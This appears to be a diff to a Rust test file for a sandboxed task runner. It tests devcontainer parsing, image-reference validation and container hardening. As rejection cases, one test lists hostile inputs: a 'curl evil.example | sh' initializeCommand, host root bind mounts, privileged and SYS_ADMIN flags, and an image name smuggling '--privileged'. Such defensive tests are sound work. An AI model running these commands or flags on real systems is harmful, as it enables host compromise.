@@ -3492,6 +3492,43 @@ mod github_queue {
     const NEEDS: &str = r#", "needs": {"network": ["GET api.github.com/repos/acme/**"], "context": true, "stdio_mcp": true, "mcp_hosts": ["mcp.acme.example"]}"#;
 
     #[test]
+    fn a_project_names_its_environment_through_a_devcontainer_subset() {
+        let p = project();
+        let dc = r#"{
+            // comments and trailing commas are allowed in devcontainer.json
+            "name": "acme env", "image": "ghcr.io/acme/toto-env:1.2",
+            "containerEnv": {"X": "1"}, "postCreateCommand": "npm ci", /* editor */ "customizations": {"vscode": {}},
+        }"#;
+        p.fake.state.lock().unwrap().files.push((".devcontainer/devcontainer.json".into(), dc.as_bytes().to_vec()));
+        let with_env = descriptor(&p.key, r#", "environment": {"devcontainer": ".devcontainer/devcontainer.json"}"#);
+        let d = Descriptor::parse(with_env.as_bytes()).unwrap();
+        let q = p.fake.queue(None);
+        let (image, warnings) = d.environment_image(&|path| q.file(path)).unwrap().unwrap();
+        assert_eq!(image, "ghcr.io/acme/toto-env:1.2");
+        assert!(warnings.iter().any(|w| w.contains("containerEnv")) && warnings.iter().any(|w| w.contains("postCreateCommand")), "{warnings:?}");
+        assert!(!warnings.iter().any(|w| w.contains("customizations") || w.contains("name")), "editor settings are not worth a warning: {warnings:?}");
+
+        let mut cfg = contributor("proj-env");
+        let notes = projects::add(&mut cfg, "org/proj", &d, &AddOptions { share: 1, accept: accept(&[]), token_file: None, image: Some(image.clone()) }).unwrap();
+        assert_eq!(cfg.environments["acme"], image);
+        assert!(notes.iter().any(|n| n.contains("ghcr.io/acme/toto-env:1.2") && n.contains("unprivileged")), "{notes:?}");
+        // Re-adding without an environment drops the old image; removing the project drops it too.
+        projects::add(&mut cfg, "org/proj", &d, &AddOptions { share: 1, accept: accept(&[]), token_file: None, image: None }).unwrap();
+        assert!(cfg.environments.is_empty());
+        projects::add(&mut cfg, "org/proj", &d, &AddOptions { share: 1, accept: accept(&[]), token_file: None, image: Some(image) }).unwrap();
+        projects::remove(&mut cfg, "acme").unwrap();
+        assert!(cfg.environments.is_empty());
+        assert!(projects::add(&mut cfg, "org/proj", &d, &AddOptions { share: 1, accept: accept(&[]), token_file: None, image: Some("alpine".into()) }).is_err(), "unqualified images are refused");
+
+        // missing file, and descriptors with both or neither source
+        let missing = Descriptor::parse(descriptor(&p.key, r#", "environment": {"devcontainer": "nope.json"}"#).as_bytes()).unwrap();
+        assert!(missing.environment_image(&|path| q.file(path)).unwrap_err().to_string().contains("not there"));
+        for env in [r#"{}"#, r#"{"image": "ghcr.io/a/b:1", "devcontainer": "x.json"}"#, r#"{"devcontainer": "../x.json"}"#, r#"{"image": "latest"}"#] {
+            assert!(Descriptor::parse(descriptor(&p.key, &format!(r#", "environment": {env}"#)).as_bytes()).is_err(), "{env}");
+        }
+    }
+
+    #[test]
     fn adding_a_project_trusts_it_but_leaves_risky_permissions_off() {
         let p = project();
         p.fake.state.lock().unwrap().files.push((".toto/project.json".into(), descriptor(&p.key, NEEDS).into_bytes()));
@@ -3500,7 +3537,7 @@ mod github_queue {
         assert_eq!(d.fingerprint().len(), 16);
 
         let mut cfg = contributor("proj-add");
-        let notes = projects::add(&mut cfg, "org/proj", &d, &AddOptions { share: 3, accept: accept(&[]), token_file: None }).unwrap();
+        let notes = projects::add(&mut cfg, "org/proj", &d, &AddOptions { share: 3, accept: accept(&[]), token_file: None, image: None }).unwrap();
         assert_eq!(cfg.projects["acme"], d.public_key);
         assert_eq!((cfg.policy.project_shares["acme"], cfg.sources["acme"].as_str()), (3, "org/proj"));
         assert_eq!(cfg.policy.allowed_kinds, ["summarise"]);
@@ -3517,7 +3554,7 @@ mod github_queue {
         assert!(cfg.policy.admit(&t, 0, now).is_err(), "the network rule was not accepted");
 
         // Accepting by name grants exactly those things, and adding again changes nothing else.
-        let all = AddOptions { share: 3, accept: accept(&["network", "context", "stdio-mcp", "mcp-hosts"]), token_file: Some("/gh.token".into()) };
+        let all = AddOptions { share: 3, accept: accept(&["network", "context", "stdio-mcp", "mcp-hosts"]), token_file: Some("/gh.token".into()), image: None };
         projects::add(&mut cfg, "org/proj", &d, &all).unwrap();
         projects::add(&mut cfg, "org/proj", &d, &all).unwrap();
         assert!(cfg.policy.admit(&t, 0, now).is_ok());
@@ -3531,7 +3568,7 @@ mod github_queue {
         let p = project();
         let d = Descriptor::parse(descriptor(&p.key, "").as_bytes()).unwrap();
         let mut cfg = contributor("proj-bad");
-        let opts = |a: &[&str]| AddOptions { share: 1, accept: accept(a), token_file: None };
+        let opts = |a: &[&str]| AddOptions { share: 1, accept: accept(a), token_file: None, image: None };
         projects::add(&mut cfg, "org/proj", &d, &opts(&[])).unwrap();
         let other = Descriptor::parse(descriptor(&crate::manifest::generate_key(), "").as_bytes()).unwrap();
         let e = projects::add(&mut cfg, "org/proj", &other, &opts(&[])).unwrap_err().to_string();
@@ -3560,7 +3597,7 @@ mod github_queue {
         let d1 = Descriptor::parse(descriptor(&p.key, "").as_bytes()).unwrap();
         let d2 = Descriptor::parse(descriptor(&p.key, "").replace("acme", "acme-two").as_bytes()).unwrap();
         let mut cfg = contributor("proj-rm");
-        let opts = AddOptions { share: 1, accept: accept(&[]), token_file: None };
+        let opts = AddOptions { share: 1, accept: accept(&[]), token_file: None, image: None };
         projects::add(&mut cfg, "org/proj", &d1, &opts).unwrap();
         projects::add(&mut cfg, "org/proj", &d2, &opts).unwrap();
         assert_eq!(projects::list(&cfg).len(), 2);
@@ -3571,5 +3608,138 @@ mod github_queue {
         assert!(cfg.queues.is_empty() && cfg.projects.is_empty());
         assert!(projects::remove(&mut cfg, "acme").is_err());
         assert!(projects::list(&cfg).is_empty());
+    }
+}
+
+mod devcontainer {
+    use crate::devcontainer::*;
+
+    #[test]
+    fn image_references_must_be_qualified_and_pinned_to_a_tag_or_digest() {
+        let digest = format!("ghcr.io/a/b@sha256:{}", "ab".repeat(32));
+        for good in ["ghcr.io/acme/env:1.2", "quay.io/a/b/c:v1", "registry.example.com:5000/x/y:latest", "localhost/env:dev", digest.as_str()] {
+            assert!(valid_image_ref(good), "{good}");
+        }
+        for bad in ["alpine", "alpine:3", "acme/env:1", "ghcr.io/acme/env", "ghcr.io/acme/ENV:1", "ghcr.io/acme/env:1 --privileged", "ghcr.io/a/b@sha256:short", "ghcr.io/a/b:", "-v/x:/y:rw", "ghcr.io//b:1", ""] {
+            assert!(!valid_image_ref(bad), "{bad}");
+        }
+    }
+
+    #[test]
+    fn jsonc_comments_and_trailing_commas_are_handled_without_touching_strings() {
+        let v: serde_json::Value = serde_json::from_str(&strip_jsonc("{ \"url\": \"http://x//y /* not a comment */\", // c\n \"a\": [1, 2,], /* b */ \"q\": \"\\\" // still string\", }")).unwrap();
+        assert_eq!(v["url"], "http://x//y /* not a comment */");
+        assert_eq!(v["a"], serde_json::json!([1, 2]));
+        assert_eq!(v["q"], "\" // still string");
+    }
+
+    #[test]
+    fn keys_that_act_on_the_host_or_build_on_it_are_refused_with_a_reason() {
+        let ok = parse(r#"{"image": "ghcr.io/a/b:1"}"#).unwrap();
+        assert_eq!(ok, Parsed { image: "ghcr.io/a/b:1".into(), warnings: vec![] });
+        for (key, value) in [
+            ("build", r#"{"dockerfile": "Dockerfile"}"#), ("dockerFile", r#""Dockerfile""#), ("features", r#"{"ghcr.io/devcontainers/features/node:1": {}}"#),
+            ("mounts", r#"["source=/,target=/host,type=bind"]"#), ("runArgs", r#"["--privileged"]"#), ("privileged", "true"),
+            ("capAdd", r#"["SYS_ADMIN"]"#), ("securityOpt", r#"["seccomp=unconfined"]"#), ("initializeCommand", r#""curl evil.example | sh""#),
+            ("workspaceMount", r#""source=/,target=/w,type=bind""#), ("dockerComposeFile", r#""compose.yml""#),
+        ] {
+            let e = parse(&format!(r#"{{"image": "ghcr.io/a/b:1", "{key}": {value}}}"#)).unwrap_err().to_string();
+            assert!(e.contains(key) && e.contains("published image"), "{key}: {e}");
+        }
+        assert!(parse(r#"{"name": "x"}"#).unwrap_err().to_string().contains("no `image`"));
+        assert!(parse(r#"{"image": "node:20"}"#).unwrap_err().to_string().contains("fully qualified"));
+        assert!(parse("[]").is_err() && parse("{").is_err());
+        let w = parse(r#"{"image": "ghcr.io/a/b:1", "remoteUser": "root", "forwardPorts": [3000], "futureKey": 1}"#).unwrap().warnings;
+        assert!(w.iter().any(|x| x.contains("remoteUser") && x.contains("unprivileged")), "root cannot be requested: {w:?}");
+        assert!(w.iter().any(|x| x.contains("forwardPorts")) && w.iter().any(|x| x.contains("futureKey")));
+    }
+}
+
+mod environment_images {
+    use crate::manifest::SandboxProfile;
+    use crate::sandbox::DockerSandbox;
+
+    #[test]
+    fn each_project_runs_in_the_image_it_named_and_others_in_the_default() {
+        let mut sb = DockerSandbox::new("alpine");
+        sb.images.insert("acme".into(), "ghcr.io/acme/toto-env:1".into());
+        assert_eq!(sb.image_for("acme"), "ghcr.io/acme/toto-env:1");
+        assert_eq!(sb.image_for("other"), "alpine");
+        let args = sb.run_args_for("t1", sb.image_for("acme"), &SandboxProfile::default()).unwrap();
+        assert_eq!(args[args.len() - 3], "ghcr.io/acme/toto-env:1", "{args:?}");
+        for flag in ["--read-only", "--cap-drop", "no-new-privileges", "65534:65534"] {
+            assert!(args.iter().any(|a| a.contains(flag)), "the project's image gets the same hardening: {flag}");
+        }
+    }
+
+    /// Live: the image comes from the project, so a tool only in that image is there for its tasks.
+    #[test]
+    fn live_a_projects_tasks_run_in_its_own_image() {
+        use crate::sandbox::{exec, Sandbox};
+        if !super::proxy_container::docker_has("alpine") || !super::proxy_container::docker_has("toto-omnigent-test") {
+            eprintln!("skipping: needs docker, alpine and toto-omnigent-test");
+            return;
+        }
+        let mut sb = DockerSandbox::new("alpine");
+        sb.images.insert("a".into(), "toto-omnigent-test".into());
+        sb.probe().unwrap();
+        let key = crate::manifest::generate_key();
+        let has_python = |project: &str, id: &str| {
+            let t = super::task(id, project, 1, &key);
+            let ws = sb.create(&t, &t.sandbox_profile).unwrap();
+            let out = exec(&ws, &["sh", "-c", "command -v python3 >/dev/null && echo yes || echo no"], std::time::Duration::from_secs(20)).unwrap();
+            sb.destroy(ws).unwrap();
+            String::from_utf8_lossy(&out.stdout).trim().to_string()
+        };
+        assert_eq!(has_python("a", "envimg-a"), "yes", "project a runs in its own image");
+        assert_eq!(has_python("b", "envimg-b"), "no", "project b runs in the default image");
+    }
+}
+
+mod owner_guide_examples {
+    use crate::config::Config;
+    use crate::manifest::TaskManifest;
+    use crate::projects::{self, AddOptions, Descriptor};
+
+    const DESCRIPTOR: &str = include_str!("../docs/examples/project/.toto/project.json");
+    const DEVCONTAINER: &str = include_str!("../docs/examples/project/.devcontainer/toto/devcontainer.json");
+    const TASK: &str = include_str!("../docs/examples/project/task.json");
+    const CONTEXT_DIR: &str = concat!(env!("CARGO_MANIFEST_DIR"), "/docs/examples/project/context");
+
+    /// The files in the owner guide must work together: a contributor adds the example project, the
+    /// example task is admitted once they accept what it needs, and its context passes the runner's checks.
+    #[test]
+    fn the_example_project_works_end_to_end_with_policy() {
+        let key = crate::manifest::generate_key();
+        let hex_key = hex::encode(key.verifying_key().to_bytes());
+        let d = Descriptor::parse(DESCRIPTOR.replace("<hex key printed by `toto project-key project.key`>", &hex_key).as_bytes()).unwrap();
+        let dc = crate::devcontainer::parse(DEVCONTAINER).unwrap();
+        assert!(dc.warnings.is_empty(), "the example is clean: {:?}", dc.warnings);
+        let (image, _) = d.environment_image(&|path| {
+            assert_eq!(path, ".devcontainer/toto/devcontainer.json");
+            Ok(Some(DEVCONTAINER.as_bytes().to_vec()))
+        }).unwrap().unwrap();
+
+        let mut cfg = Config::starter(&super::fixture("guide").dir);
+        let t: TaskManifest = serde_json::from_str(TASK).unwrap();
+        assert_eq!((t.project_id.as_str(), t.kind.as_str()), (d.id.as_str(), d.kinds[0].as_str()));
+        t.sign(&key).unwrap();
+        let now = chrono::Local::now();
+        let mut accept = std::collections::BTreeSet::new();
+        projects::add(&mut cfg, "acme/docs", &d, &AddOptions { share: 1, accept: accept.clone(), token_file: None, image: Some(image) }).unwrap();
+        assert!(cfg.policy.admit(&t, 0, now).is_err(), "the task needs network, which the contributor has not accepted");
+        accept.insert("network".to_string());
+        accept.insert("context".to_string());
+        projects::add(&mut cfg, "acme/docs", &d, &AddOptions { share: 1, accept, token_file: None, image: Some("ghcr.io/acme/toto-env:1.0".into()) }).unwrap();
+        cfg.policy.available_tools = t.tool_requirements.clone();
+        assert!(cfg.policy.admit(&t, 0, now).is_ok(), "{:?}", cfg.policy.admit(&t, 0, now));
+        assert!(t.sandbox_profile.network_allowlist.iter().all(|r| d.needs.network.contains(r)), "the task asks for no more than `needs` declares");
+
+        // The context directory is packed and checked the way `post-task` and the runner do.
+        let limits = crate::archive::Limits::new(1 << 20);
+        let bytes = crate::archive::to_bytes(&crate::archive::pack_dir(std::path::Path::new(CONTEXT_DIR), limits).unwrap()).unwrap();
+        let ctx = crate::context::ProjectContext::parse(&bytes, limits).unwrap();
+        assert!(!ctx.skills.is_empty() && !ctx.instructions.is_empty(), "{}", ctx.summary());
+        cfg.policy.admit_context(&ctx).unwrap();
     }
 }
